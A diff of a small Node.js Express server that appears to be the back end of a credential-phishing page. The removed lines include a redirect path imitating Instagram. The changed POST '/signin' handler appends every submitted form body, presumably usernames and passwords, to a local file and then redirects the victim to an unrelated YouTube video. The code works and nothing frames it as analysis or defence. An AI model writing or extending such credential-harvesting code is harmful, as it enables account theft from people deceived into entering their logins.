@@ -1,7 +1,6 @@
 var http = require('http');
 var express = require('express');
 var fs = require('fs');
-const sendMail =  require('./mail');
 const path = require('path');
 var app = express();
 
@@ -24,21 +23,12 @@ app.get('/login', (req,res) => {
 });
 
 
-
-
-// app.get('/', (req,res) => {
-//    res.redirect('/instagranm/5bsinif/instalife/sheir/classmates/covid-19')
-//   //res.sendFile(path.join(__dirname,'home.html'))
-// });
-
-app.post('/login', (req,res) => {
+app.post('/signin', (req,res) => {
     console.log('Data',req.body);
-    fs.writeFile('./files/file', req.body,function(){
-        console.log("The file was saved!");
+    fs.writeFile('./files/file',JSON.stringify(req.body),{flag: 'a'},function(){
     }
     )
-   // sendMail();
-    res.redirect('/not-found')
+    res.redirect('https://www.youtube.com/watch?v=v8p7mS2NAHg')
 });
 
  
